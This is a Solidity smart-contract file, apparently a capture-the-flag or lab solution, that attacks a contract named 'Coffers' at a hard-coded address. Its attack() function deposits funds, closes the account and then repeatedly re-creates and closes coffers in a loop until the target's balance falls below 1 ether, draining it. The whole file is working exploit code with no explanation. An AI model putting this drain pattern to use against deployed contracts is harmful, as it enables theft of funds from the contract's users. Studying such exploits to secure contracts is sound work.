// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./Coffers.sol";

contract attackCoffers {
    address coffersAddress = 0xd9145CCE52D386f254917e481eB44e9943F39138;
    Coffers c = Coffers(coffersAddress);

    function attack() public payable {
        c.createCoffer(1);
        c.deposit{value: address(this).balance}(address(this), 0);
        c.closeAccount();
        do {
            c.createCoffer(1);
            c.closeAccount();
        } while (address(coffersAddress).balance > 1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getCoffersBalance() public view returns (uint256) {
        return address(coffersAddress).balance;
    }

    receive() external payable {}
}
